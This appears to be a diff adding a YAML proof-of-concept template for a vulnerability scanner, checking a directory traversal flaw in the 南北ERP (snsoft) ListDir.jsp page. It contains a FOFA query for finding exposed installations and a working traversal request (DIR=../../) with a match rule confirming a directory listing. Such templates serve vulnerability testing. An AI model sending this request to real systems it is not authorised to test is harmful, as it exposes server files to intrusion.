@@ -1,0 +1,15 @@
+id: poc-yaml-snsoft-listdir-jsp-directory-traversal
+info:
+  name: 南北ERP ListDir.jsp 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: 南北ERP
+  fofa: body="IdInstalClient" || title="snsoft" || body="/snsoft/Login.jsp" || icon_hash="-1369926570"
+requests:
+- method: GET
+  path: /snsoft/tool/ListDir.jsp?DIR=../../
+  expression: status_code == 200 && contains(body,"bin") && contains(body,"snconfig")
+    && contains(body,"webapps") && !contains(body,"<") && contains(headers,"/snsoft")
+variables: {}
+transport: http
